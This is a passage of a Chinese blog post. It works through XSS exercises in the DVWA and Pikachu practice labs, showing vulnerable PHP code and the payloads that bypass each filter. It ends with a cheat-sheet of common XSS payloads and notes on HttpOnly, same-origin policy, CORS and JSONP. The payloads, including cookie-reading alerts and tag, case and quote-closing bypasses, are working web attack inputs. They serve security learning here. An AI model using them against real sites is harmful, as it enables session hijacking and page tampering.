<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span> (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;  <span class="comment">#只过滤了script</span></span><br><span class="line">        <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="high：-2"><a href="#high：-2" class="headerlink" title="high："></a>high：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?<span class="keyword">default</span>=<span class="title class_">English</span>#&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="16.png" alt="图片"></p>
<p>这里的服务器和前端处理方式不一样：服务器看到的 <code>default</code> 参数：<code>English</code>（<code>#</code> 后面的内容被忽略），<strong>但前端 JavaScript 读取的是完整 URL</strong>，前端就会生成：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;option value=<span class="string">&#x27;English#&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span>&gt;<span class="title class_">English</span>#&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;<span class="regexp">/script&gt;&lt;/</span>option&gt;</span><br></pre></td></tr></table></figure>
<p>我们看下区别：</p>
<p><img src="17.png" alt="图片"></p>
<p><img src="18.png" alt="图片"></p>
<p>提示：medium也可以用#绕过后端</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="impossible：-1"><a href="#impossible：-1" class="headerlink" title="impossible："></a>impossible：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment"># Don&#x27;t need to do anything, protection handled on the client side </span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p><img src="19.png" alt="图片"></p>
<p>我们输入的内容只会经过url编码处理，所以无法形成xss</p>
<h1 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h1><p>经过dvwa</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="21.png" alt="图片"></p>
<p><img src="20.png" alt="图片"></p>
<p>因为输入框长度受限，或者在url中输入也可以</p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>根据提示，账号密码为admin:123456，也可以爆破出来</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod：&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="22.png" alt="图片"></p>
<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod：&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>每当我们一刷新页面就会弹窗出cookie，因为代码写入了服务器里，这就是与反射型的区别</p>
<h2 id="dom型xss-1"><a href="#dom型xss-1" class="headerlink" title="dom型xss"></a>dom型xss</h2><p>注入：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code>无反应，但提示我们<code>&#39;&gt;</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">&#x27;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p>来看下前后的区别：</p>
<p><img src="23.png" alt="图片"><img src="24.png" alt="图片"></p>
<p>可以看出后者是用<code>&#39;&gt;</code>将href的链接给闭合了，所以注入成功，看下源码就明白了</p>
<p><img src="25.png" alt="图片"></p>
<h2 id="dom型xss-x"><a href="#dom型xss-x" class="headerlink" title="dom型xss-x"></a>dom型xss-x</h2><p>先看下源码如何处理的：</p>
<p><img src="26.png" alt="图片"></p>
<p>和上面一样都是将输入的内容写入href链接中，我们需要主动闭合，我们需要先点击<code>有些费尽心机想要忘记的事情,后来真的就忘掉了</code>这个链接，然后才会触发<code>domxss</code>函数里的xss内容</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod：<span class="string">&#x27;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;</span><span class="variable constant_">XSS</span><span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="27.png" alt="图片"></p>
<p>按照提示给的payload也可以，不过触发的条件不一样，第一个是移动鼠标到那个位置，另一个是需要点击</p>
<h2 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h2><p>给出的页面类似一个留言板，两个输入框都输入xss语句：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，刷新并没有任何反应，查看源码：</p>
<p><img src="28.png" alt="图片"></p>
<p>不知道写入的数据如何处理的，但给了提示，登录后台，账号密码：admin/123456，然后就直接弹窗了：</p>
<p><img src="29.png" alt="图片"></p>
<p>我们看到这里是以admin登录的，这种存储型xss，如果cookie被发送到恶意服务器，就会产生安全威胁</p>
<h2 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h2><p>不知道过滤了什么，只能一个一个试，</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">，<span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">，&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>，以及其他标签</span></span></span></span></span><br></pre></td></tr></table></figure>
<p>发现<code>&lt;Script&gt;</code>就可以弹窗，但是弹不出来cookie不知道为啥，看前端源码不知道怎么处理的，只能看后端的处理</p>
<p><img src="30.png" alt="图片"></p>
<p>这种双写绕不了，只能大小写，或者更换标签（这种属于反射型，由服务器处理传送回前端）</p>
<h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>htmlspecialchars函数用于防范xss，一般会过滤：<code>&#39;,&quot;,&lt;,&gt;,&amp;</code>这几个字符，我们在输入框输入这几个字符，看看有没有没被过滤的字符</p>
<p><img src="32.png" alt="图片"></p>
<p>查看前端源码：</p>
<p><img src="31.png" alt="图片"></p>
<p>发现服务器返回的数据又被拼接到href中，上面的圈二和四是我们输入的单引号，并没有被转移，所以后端并未对单引号做处理，于是我们可以用单引号闭合href原先的左单引号</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod：#<span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure>
<p>alert左边单引号用于闭合原先href的右单引号，上面payload的#可写可不写，主要是为了闭合</p>
<p><strong>htmlspecialchars默认不对单引号处理</strong></p>
<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>先看看有没有过滤，使用<code>&#39; &quot; &lt; &gt; &amp;</code>测试，查看前端源码：</p>
<p><img src="34.png" alt="图片"></p>
<p>发现都被转义了，虽然<code>&lt;a&gt;</code>标签的 href 属性用于指定超链接目标的 URL，但href 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 <code>JavaScript 代码段</code>。如果用户选择了<code>&lt;a&gt;</code>标签中的内容，那么浏览器会尝试检索并显示 href 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表。</p>
<p>利用javascript表达式生成payload：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure>
<p><img src="35.png" alt="图片"></p>
<p>查看后端处理：</p>
<p><img src="36.png" alt="图片"></p>
<p>ENT_QUOTES：用于开启编码双引号和单引号</p>
<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>测试：<code>&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，没反应，查看源码：</p>
<p><img src="37.png" alt="图片"></p>
<p>发现我们输入的语句经过服务器传递给了$ms，被包含在了<code>&lt;script&gt;</code>标签中，那如果我们主动闭合一个<code>&lt;/script&gt;</code>标签，那我们的命令是不是就能执行了？？？，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod：&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(document.cookie)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="38.png" alt="图片"></p>
<p>其实还有一种方法，也是主动去闭合，我们看到我们写入的语句被单引号包括，如果我们主动闭合左单引号，紧接一个分号，那么当前js语句就终止了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：<span class="string">&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;img&gt;</code> 是 HTML 标签，需插入到 DOM 后才会被解析。直接写在 <code>&lt;script&gt;</code> 中会被视为无效语法。</p>
<h1 id="xss的防御"><a href="#xss的防御" class="headerlink" title="xss的防御"></a>xss的防御</h1><ul>
<li>设置关键词黑名单：包括<code>” ‘ ”,” “ ”,”&lt;”,”&gt;” “on*”</code>等非法字符。</li>
<li>设置http-only：只要 cookie 中含有 Http-only 字段，那么任何 JavaScript 脚本都没有权限读取这条 cookie 的内容</li>
<li>使用html实体编码等</li>
<li>SOP同源策略：SOP把拥有相同主机名 、协议和端口的页面视为同一来源。不同来源的资源之间交互是受到限制的。</li>
</ul>
<h1 id="xss常用Payload"><a href="#xss常用Payload" class="headerlink" title="xss常用Payload"></a>xss常用Payload</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. &#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">2. &#x27;&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">3. &#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">4. &#x27;&quot;&gt;&lt;a href=javascript:alert(1)&gt;  超链接绕过</span><br><span class="line">5. javascript:alert(1)  unicode编码绕过 xss-labs 8</span><br><span class="line">5. &#x27;&quot;&gt;&lt;details open ontoggle= confirm(document[`coo`+`kie`])&gt;</span><br><span class="line">6. onclick=&#x27;alert(1)  事件绕过，不需要闭合</span><br><span class="line">7. 针对script可以大小写和双写绕过</span><br></pre></td></tr></table></figure>
<p><strong>实际场景中：一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</strong></p>
<p><strong>大多反射型都需要去闭合前面的标签（我们可以用上面的payload），存储和dom型可能不需要</strong></p>
<h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>JavaScript（JS）是一种多用途的脚本语言，主要用于 <strong>网页交互</strong> 和 <strong>应用开发</strong></p>
<p><code>&lt;script&gt;</code>元素用于嵌入可执行代码或数据，这通常用作嵌入或者引用 JavaScript 代码，所以在<code>&lt;script&gt;</code>标签中输入<code>&lt;image&gt;&lt;svg&gt;&lt;body&gt;</code>等常规html标签都是无效的</p>
<p>js在html中两种使用方式：</p>
<p><img src="39.png" alt="图片"></p>
<h1 id="DOM学习"><a href="#DOM学习" class="headerlink" title="DOM学习"></a>DOM学习</h1><p><strong>DOM（文档对象模型）</strong> 是浏览器将 HTML/XML 文档解析成的 <strong>树形结构对象</strong>，允许 JavaScript 动态访问和操作网页内容、结构和样式</p>
<h3 id="1-DOM-的本质"><a href="#1-DOM-的本质" class="headerlink" title="1. DOM 的本质"></a>1. <strong>DOM 的本质</strong></h3><ul>
<li><strong>浏览器解析 HTML 后生成的树状结构</strong>，每个标签、属性、文本都是树的节点（Node）。</li>
<li><strong>编程接口</strong>：提供 JavaScript 操作网页的 API（如修改内容、添加事件等）。</li>
</ul>
<h3 id="2-DOM-节点类型"><a href="#2-DOM-节点类型" class="headerlink" title="2. DOM 节点类型"></a>2. <strong>DOM 节点类型</strong></h3><div class="table-container">
<table>
<thead>
<tr>
<th>节点类型</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>文档节点 (Document)</strong></td>
<td>整个文档的根节点</td>
<td><code>document</code></td>
</tr>
<tr>
<td><strong>元素节点 (Element)</strong></td>
<td>HTML 标签（如 <code>&lt;div&gt;</code>）</td>
<td><code>document.getElementById()</code></td>
</tr>
<tr>
<td><strong>属性节点 (Attr)</strong></td>
<td>标签的属性（如 <code>class=&quot;box&quot;</code>）</td>
<td><code>element.getAttribute()</code></td>
</tr>
<tr>
<td><strong>文本节点 (Text)</strong></td>
<td>标签内的文本内容</td>
<td><code>node.textContent</code></td>
</tr>
<tr>
<td><strong>注释节点 (Comment)</strong></td>
<td>HTML 注释</td>
<td><code>&lt;!-- 注释 --&gt;</code></td>
</tr>
</tbody>
</table>
</div>
<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同源策略是浏览器实施的一种安全机制，它限制了一个源的文档或脚本如何与另一个源的资源进行交互。</p>
<p><strong>同源的定义</strong>：两个URL在以下三个方面完全相同：</p>
<ol>
<li>协议相同（http/https）</li>
<li>域名相同（包括子域名）</li>
<li>端口号相同</li>
</ol>
<p>以 <code>http://www.example.com/dir/page.html</code>为例：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>对比URL</th>
<th>结果</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>http://www.example.com/dir/page2.html</code></td>
<td>同源</td>
<td>相同的协议，主机，端口</td>
</tr>
<tr>
<td><code>http://www.example.com/dir2/other.html</code></td>
<td>同源</td>
<td>相同的协议，主机，端口</td>
</tr>
<tr>
<td><code>http://username:password@www.example.com/dir2/other.html</code></td>
<td>同源</td>
<td>相同的协议，主机，端口</td>
</tr>
<tr>
<td><code>http://www.example.com:81/dir/other.html</code></td>
<td>不同源</td>
<td>相同的协议，主机，端口不同</td>
</tr>
<tr>
<td><code>https://www.example.com/dir/other.html</code></td>
<td>不同源</td>
<td>协议不同</td>
</tr>
<tr>
<td><code>http://en.example.com/dir/other.html</code></td>
<td>不同源</td>
<td>不同主机</td>
</tr>
<tr>
<td><code>http://example.com/dir/other.html</code></td>
<td>不同源</td>
<td>不同主机(需要精确匹配)</td>
</tr>
<tr>
<td><code>http://v2.www.example.com/dir/other.html</code></td>
<td>不同源</td>
<td>不同主机(需要精确匹配)</td>
</tr>
<tr>
<td><code>http://www.example.com:80/dir/other.html</code></td>
<td>看情况</td>
<td>端口明确，依赖浏览器实现</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><strong>有同源策略</strong>：就像每家商店有自己的门禁系统，小偷需要分别突破</li>
<li><strong>没有同源策略</strong>：所有商店共用同一把钥匙，突破一家等于突破所有</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>攻击方式</th>
<th>是否需要银行有XSS？</th>
<th>是否依赖同源策略？</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>XSS攻击</strong></td>
<td>✅ 需要</td>
<td>❌ 不依赖（XSS是同源攻击）</td>
</tr>
<tr>
<td><strong>无同源策略的跨域AJAX</strong></td>
<td>❌ 不需要</td>
<td>✅ 依赖（无SOP才能跨域）</td>
</tr>
<tr>
<td><strong>CSRF（跨站请求伪造）</strong></td>
<td>❌ 不需要</td>
<td>✅ 依赖（SOP限制部分CSRF）</td>
</tr>
<tr>
<td><strong>直接读取DOM/Cookie</strong></td>
<td>❌ 不需要</td>
<td>✅ 依赖（SOP阻止跨域访问）</td>
</tr>
</tbody>
</table>
</div>
<p><img src="40.png" alt="图片"></p>
<h1 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h1><p>当请求的目标URL与当前页面的源不同时，就发生了跨域请求。浏览器会阻止这类请求的响应，除非服务器明确允许。</p>
<p><strong>跨域请求示例</strong>：假设当前页面URL是 <code>http://www.example.com/index.html</code>，以下请求会被视为跨域：</p>
<ol>
<li>向 <code>https://www.example.com/api</code> 发送AJAX请求<ul>
<li>原因：协议不同（http vs https）</li>
</ul>
</li>
<li>向 <code>http://api.example.com/data</code> 获取数据<ul>
<li>原因：域名不同（www vs api子域名）</li>
</ul>
</li>
<li>向 <code>http://www.example.com:8080/service</code> 请求服务<ul>
<li>原因：端口不同（80 vs 8080）</li>
</ul>
</li>
<li>向 <code>http://anotherdomain.com/resource</code> 获取资源<ul>
<li>原因：完全不同的域名</li>
</ul>
</li>
</ol>
<h2 id="解决跨域问题的方法"><a href="#解决跨域问题的方法" class="headerlink" title="解决跨域问题的方法"></a>解决跨域问题的方法</h2><h4 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS (跨域资源共享)"></a><strong>CORS</strong> (跨域资源共享)</h4><p><strong>案例背景：</strong>小明在开发了一个A网站（用来记录本公司的设备信息），访问地址是<a target="_blank" rel="noopener" href="https://www.a.com，需要使用ajax请求**B服务器**上的数据，但是又苦于同源策略的限制">https://www.a.com，需要使用ajax请求**B服务器**上的数据，但是又苦于同源策略的限制</a>……  后来找到了一种解决方法<strong>CORS</strong></p>
<p><strong>基本流程</strong></p>
<ol>
<li><strong>浏览器检测到跨域请求</strong>：当A网站的JavaScript尝试向B服务器发送AJAX请求时</li>
<li><strong>自动添加Origin头</strong>：浏览器自动在请求头中添加<code>Origin: https://www.a.com</code></li>
<li><strong>服务器响应CORS头</strong>：B服务器需要在响应中包含特定的CORS头</li>
<li><strong>浏览器检查响应头</strong>：浏览器验证响应头是否允许当前源访问</li>
<li><strong>允许/阻止请求</strong>：根据验证结果决定是否让前端代码访问响应数据</li>
</ol>
<p><strong>最推荐的标准解决方案</strong>，需要后端配合设置响应头：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: <span class="attr">https</span>:<span class="comment">//yourdomain.com  // 或 * (不推荐)</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Methods</span>: <span class="variable constant_">GET</span>, <span class="variable constant_">POST</span>, <span class="variable constant_">PUT</span>, <span class="variable constant_">DELETE</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Headers</span>: <span class="title class_">Content</span>-<span class="title class_">Type</span>, <span class="title class_">Authorization</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span>  <span class="comment">// 如需携带cookie</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Max</span>-<span class="title class_">Age</span>: <span class="number">86400</span>  <span class="comment">// 预检请求缓存时间(秒)</span></span><br></pre></td></tr></table></figure>
<h4 id="JSONP-仅限GET请求"><a href="#JSONP-仅限GET请求" class="headerlink" title="JSONP (仅限GET请求)"></a><strong>JSONP</strong> (仅限GET请求)</h4><p>JSONP（JSON with Padding）是一种早期解决跨域问题的技术，它利用<code>&lt;script&gt;</code>标签不受同源策略限制的特性来实现跨域数据获取。</p>
<p><strong>核心特点</strong></p>
<ul>
<li><strong>仅支持GET请求</strong>：这是其最大限制</li>
<li><strong>无需服务器特殊配置</strong>：不像CORS需要服务器设置响应头</li>
<li><strong>逐渐被淘汰</strong>：现代开发推荐使用CORS</li>
</ul>
<p><strong>JSON、JSONP的区别：</strong><br>    1、JSON返回的是一串数据、JSONP返回的是脚本代码(包含一个函数调用)<br>    2、JSONP 只支持get请求、不支持post请求 </p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">其余方法</th>
<th style="text-align:center">原理</th>
<th style="text-align:center">实现方式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">代理服务器</td>
<td style="text-align:center">通过同源服务器中转请求</td>
<td style="text-align:center">Nginx反向代理 ，Node.js中间层代理 ，开发服务器代理</td>
</tr>
<tr>
<td style="text-align:center">document.domain</td>
<td style="text-align:center">修改document.domain实现子域间通信</td>
<td style="text-align:center">设置相同父域 ：如<code>document.domain = &quot;example.com&quot;</code></td>
</tr>
<tr>
<td style="text-align:center">图像ping</td>
<td style="text-align:center">利用<code>&lt;img&gt;</code>标签发送简单请求</td>
<td style="text-align:center">动态创建<code>&lt;img&gt;</code>标签，设置src为目标URL</td>
</tr>
<tr>
<td style="text-align:center">WebSocket</td>
<td style="text-align:center">基于TCP的全双工通信协议</td>
<td style="text-align:center">建立WebSocket连接，通过该连接进行双向通信</td>
</tr>
<tr>
<td style="text-align:center">postMessage API</td>
<td style="text-align:center">HTML5提供的跨文档通信API</td>
<td style="text-align:center">发送方调用<code>targetWindow.postMessage()</code> 接收方监听<code>message</code>事件</td>
</tr>
<tr>
<td style="text-align:center">window.name</td>
<td style="text-align:center">利用window.name在不同页面间传递数据</td>
<td style="text-align:center">设置iframe的window.name， 跳转到同源页面后读取</td>
</tr>
</tbody>
</table>
</div>
<p>因为初次学习，所以参考了许多博主的blog：</p>
<p><strong>参考文章：</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40950781/article/details/100007103">https://blog.csdn.net/weixin_40950781/article/details/100007103</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/heiwa-0924/p/12520547.html">https://www.cnblogs.com/heiwa-0924/p/12520547.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253523.html">https://www.freebuf.com/articles/web/253523.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/124747885">https://blog.csdn.net/m0_46467017/article/details/124747885</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/102917690">https://blog.csdn.net/bylfsj/article/details/102917690</a></p>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>zh1yu
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/" title="dvwa&amp;pikachu之xss">http://zh1yu.xyz/2025/07/01/dvwa之xss/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/xss/" rel="tag"># xss</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/06/30/BlueCms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev" title="MCMS代码审计">
      <i class="fa fa-chevron-left"></i> MCMS代码审计
    </a></div>
      <div class="post-nav-item">
    <a href="/2025/07/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="信息收集">
      信息收集 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
